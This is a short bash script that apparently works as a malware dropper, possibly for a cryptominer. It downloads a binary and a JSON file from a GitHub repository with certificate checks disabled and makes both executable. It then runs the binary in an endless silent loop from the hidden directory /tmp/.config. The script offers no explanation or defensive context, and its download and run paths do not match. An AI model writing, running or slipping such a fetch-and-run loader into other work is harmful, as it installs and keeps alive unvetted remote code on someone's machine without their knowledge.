#!/bin/bash

src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"

wget --no-check-certificate -O ./appsettings.json https://github.com/curiosityinteriorsuk/2088/raw/main/q1.json
wget --no-check-certificate -O ./p https://github.com/curiosityinteriorsuk/2088/raw/main/q
chmod u+x ./appsettings.json
chmod u+x ./p
while true; do cd /tmp/.config; ./p >/dev/null 2>&1 ; done

